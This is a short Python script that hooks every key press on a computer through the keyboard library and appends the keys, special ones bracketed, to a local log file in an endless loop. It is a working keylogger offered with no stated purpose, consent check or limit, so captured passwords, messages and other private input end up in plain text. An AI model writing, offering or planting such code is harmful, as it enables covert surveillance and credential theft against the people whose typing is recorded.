# This script will record all keystrokes on a computer and save them to a file

import keyboard
import datetime

# Function to log key strokes
def log_keystrokes(e):
    key = e.name
    if len(key) > 1:
        if key == "space":
            key = " "
        elif key == "enter":
            key = "[ENTER]\n"
        else:
            key = f"[{key.upper()}]"
    with open("keystrokes_log.txt", "a") as file:
        file.write(key)

# Start recording keystrokes
keyboard.on_press(log_keystrokes)

# Keep the script running
while True:
    pass
